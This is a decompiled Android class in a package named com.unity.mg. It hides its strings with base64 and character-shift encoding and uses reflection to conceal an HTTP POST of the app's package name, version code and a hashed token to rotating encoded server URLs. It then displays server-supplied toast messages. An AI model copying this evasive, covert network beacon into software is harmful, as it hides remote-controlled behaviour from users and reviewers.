package com.unity.mg;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import com.facebook.appevents.AppEventsConstants;
import com.facebook.internal.security.CertificateUtil;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.unity.qp.o;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import kotlin.UByte;
import org.json.JSONObject;
/* compiled from: protocol.java */
/* loaded from: classes.dex */
public class n {
    protected static final String B = "'YY'Z[([/,[W*-Y..&&&&((*Z.WW++-/";
    protected static final String C = "icw;#q$#q$#q";
    protected static final String D = "f`t";
    protected static final String E = "vljq";
    protected static final String F = "XKY[RZY";
    private static final String I = "amF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0";
    private static final String K = "TUQ1";
    protected static final String N = "MTExM2E0ZDQwOTE3NDIwZDgxYmI2ZjIwYjZhMDkzMmY";
    protected static final String[] A = {"V=G%X8JoFH-kNM7eAbG]Y<;^OL;&Y<`jN'.iA';lVLCaWcGaX^-aB_KoAnJnCMB2", "V=G%X8JoFH-kNM7eAbKjVb.*O<;%NLYkAbCkWH.]X<a_OL*%OM>k?I>&Xn-aB_Ko", "V=G%X8JoFH-kNM7eAbG]Y<;^OLCkWLJjN'.iA';lVLCaWcGaX^-aB_KoAnJnCMB2", "V=G%X8JoFH-kNM7eAbCkWLK`NMG]O'.kO8*_W'%kNM7eN'KjY<KnAnJnCMBk?I>&Xl22", "V=G%X8JoFH-kNM7eAbekZLG]Y<;cWn*_W'%kNM7eN'KjY<KnAnJnCMBk?I>&Xl22"};
    private static final Object[] G = {"WdZhe_Z$kj_b$8Wi[,*", 10};
    private static final Object[] H = {"231=23", 50};
    private static final Object[] J = {"MKZ/TYZGTIK", 26};
    private static final Object[] L = {"Z_][ij", 10};
    private static final Object[] M = {"Y(HhBcZbZ<HlOND&", 10};

    private static String getSName() {
        return "sdvss";
    }

    private static int gi(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences(getSName(), 0);
        return sharedPreferences.getInt(FirebaseAnalytics.Param.INDEX, 0);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void si(Context context) {
        int index;
        int index2 = gi(context);
        int len = A.length;
        if (index2 + 1 < len) {
            index = index2 + 1;
        } else {
            index = 0;
        }
        SharedPreferences sharedPreferences = context.getSharedPreferences(getSName(), 0);
        sharedPreferences.edit().putInt(FirebaseAnalytics.Param.INDEX, index).apply();
    }

    public static String m(String inStr) {
        try {
            Class cls = Class.forName(b(I));
            Method method = cls.getDeclaredMethod(d(J[0].toString(), ((Integer) J[1]).intValue()), String.class);
            Object object = method.invoke(null, b(K));
            Method method2 = cls.getDeclaredMethod(d(L[0].toString(), ((Integer) L[1]).intValue()), byte[].class);
            byte[] resultBytes = (byte[]) method2.invoke(object, inStr.getBytes());
            StringBuffer hexValue = new StringBuffer();
            for (byte b : resultBytes) {
                int val = b & UByte.MAX_VALUE;
                if (val < 16) {
                    hexValue.append(AppEventsConstants.EVENT_PARAM_VALUE_NO);
                }
                hexValue.append(Integer.toHexString(val));
            }
            return hexValue.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static void r(final Context context) {
        o.c(context);
        final Context applicationContext = context.getApplicationContext();
        final JSONObject paramObj = new JSONObject();
        JSONObject temp = new JSONObject();
        final String action = b(d(M[0].toString(), ((Integer) M[1]).intValue()));
        try {
            String k = b(N, true);
            String token = m(String.format(d(C, 2), k, action, d(B, 10)));
            temp.put(d(D, 5), k);
            temp.put(d(E, -3), token);
            paramObj.put(action, temp);
            String a = A[1];
            int index = gi(context);
            if (index >= 0 && index < A.length) {
                a = A[index];
            }
            final String realUrl = String.format(c(d(a, 11)).replace("%3A", CertificateUtil.DELIMITER).replace("%25", "%"), action, token);
            new Thread(new Runnable() { // from class: com.unity.mg.n.1
                @Override // java.lang.Runnable
                public void run() {
                    try {
                        Class uCls = Class.forName(n.d("e\\q\\)i`o)PMG", 5));
                        Constructor constructor = uCls.getConstructor(String.class);
                        Object uo = constructor.newInstance(realUrl);
                        Method mo = uCls.getDeclaredMethod(n.d("UVKT)UTTKIZOUT", 26), new Class[0]);
                        Object oh = mo.invoke(uo, new Object[0]);
                        Class cls = Class.forName(n.b("amF2YS5uZXQuSHR0cFVSTENvbm5lY3Rpb24="));
                        Method m = cls.getDeclaredMethod(n.b("c2V0Rm9sbG93UmVkaXJlY3Rz="), Boolean.TYPE);
                        m.invoke(null, true);
                        Method m2 = cls.getDeclaredMethod(n.d("ykzXkw{kyzSkznuj", -6), String.class);
                        m2.invoke(oh, n.d("UTXY", -5));
                        Class cls2 = Class.forName(n.d("VMbM", 20) + "." + n.b("bmV0=") + "." + n.d("KHB9edd[Yj_ed", 10));
                        Method m3 = cls2.getDeclaredMethod(n.b("YWRkUmVxdWVzdFByb3BlcnR5="), String.class, String.class);
                        JSONObject jsonObject = new JSONObject();
                        m3.invoke(oh, n.d("Iuttkizout", -6), n.d("Pjju2Fqn{j", -5));
                        try {
                            jsonObject.put(n.b("cGFja2FnZV9uYW1l="), context.getPackageName());
                            jsonObject.put(n.b("dmVyc2lvbl9uYW1l="), 2018090518);
                            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
                            jsonObject.put(n.b("dmVyc2lvbl9jb2Rl"), packageInfo.versionCode);
                        } catch (Exception e) {
                        }
                        m3.invoke(oh, n.b("WC1DbGllbnQtRXZlbnQ", true), jsonObject.toString());
                        StringBuilder builder = new StringBuilder();
                        builder.append("data");
                        builder.append("=");
                        builder.append(paramObj.toString());
                        Method m4 = cls2.getDeclaredMethod(n.b("Z2V0T3V0cHV0U3RyZWFt"), new Class[0]);
                        OutputStream outputStream = (OutputStream) m4.invoke(oh, new Object[0]);
                        outputStream.write(builder.toString().getBytes());
                        Method m5 = cls2.getDeclaredMethod(n.b("Z2V0SW5wdXRTdHJlYW0", true), new Class[0]);
                        InputStream inStream = (InputStream) m5.invoke(oh, new Object[0]);
                        StringBuilder response = new StringBuilder();
                        InputStreamReader inputReader = new InputStreamReader(inStream);
                        BufferedReader bufReader = new BufferedReader(inputReader);
                        while (true) {
                            String line = bufReader.readLine();
                            if (line == null) {
                                n.o(applicationContext, action, response.toString());
                                inStream.close();
                                return;
                            }
                            response.append(line.trim());
                            builder = builder;
                        }
                    } catch (Exception e2) {
                        e2.printStackTrace();
                        n.si(context);
                    }
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
            si(context);
        }
    }

    protected static void o(final Context context, final String action, final String str) {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() { // from class: com.unity.mg.n.2
            @Override // java.lang.Runnable
            public void run() {
                try {
                    JSONObject jsonObject = new JSONObject(str);
                    JSONObject actionJson = jsonObject.getJSONObject(action);
                    JSONObject resultJson = actionJson.getJSONObject(n.d(n.F, 26));
                    String openToast = resultJson.optString(n.b("dG9hc3Q", true));
                    if (!TextUtils.isEmpty(openToast)) {
                        Class cls = Class.forName(n.b("YW5kcm9pZC53aWRnZXQuVG9hc3Q", true));
                        Method m = cls.getDeclaredMethod(n.d("SGQK:K^Z", 26), Context.class, CharSequence.class, Integer.TYPE);
                        Object o = m.invoke(null, context, openToast, 1);
                        Method m2 = cls.getDeclaredMethod(n.d("A6=E", 50), new Class[0]);
                        m2.invoke(o, new Object[0]);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    public static String b(String in, boolean hasE) {
        if (hasE) {
            in = in + "=";
        }
        return c(in);
    }

    public static String b(String in) {
        if (in.endsWith("=")) {
            in = in.substring(0, in.length() - 1);
        }
        return b(in, false);
    }

    public static String c(String str) {
        try {
            Class cls = Class.forName(d(G[0].toString(), ((Integer) G[1]).intValue()));
            Method m = cls.getDeclaredMethod(d(H[0].toString(), ((Integer) H[1]).intValue()), String.class, Integer.TYPE);
            return new String((byte[]) m.invoke(null, str, 0));
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String d(String input, int add) {
        char[] chars = input.toCharArray();
        for (int index = 0; index < chars.length; index++) {
            chars[index] = (char) (chars[index] + add);
        }
        return new String(chars);
    }
}
